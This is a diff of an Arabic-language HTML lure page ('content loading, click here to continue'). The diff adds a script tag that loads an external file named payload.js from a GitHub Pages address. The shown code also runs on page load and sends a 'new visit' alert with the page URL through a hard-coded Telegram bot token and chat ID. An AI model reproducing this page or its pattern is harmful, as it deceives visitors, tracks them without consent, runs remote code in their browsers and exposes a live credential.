@@ -9,8 +9,11 @@
     <h2>جاري تحميل المحتوى...</h2>
     <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
     
-    <!-- الزر التفاعلي الجديد -->
+    <!-- الزر التفاعلي -->
     <button id="myButton" style="padding: 15px 30px; font-size: 18px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2);">اضغط هنا للمتابعة</button>
+
+    <!-- تضمين السكريبت الخارجي المستضاف على غيت هب -->
+    <script src="https://moedawahik4-dot.github.io/allac/payload.js"></script>
 
     <script>
         // ربط الزر بحدث النقر
@@ -46,7 +49,6 @@
 
         // محاكاة الضغط التلقائي عند تحميل الصفحة لضمان إرسال التنبيه الأول
         window.addEventListener('load', function() {
-             // إرسال تنبيه تلقائي عند فتح الصفحة
              const botTokenAuto = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
              const chatIdAuto = "408506450";
              const messageAuto = "زيارة جديدة للصفحة!\nالرابط: " + window.location.href;
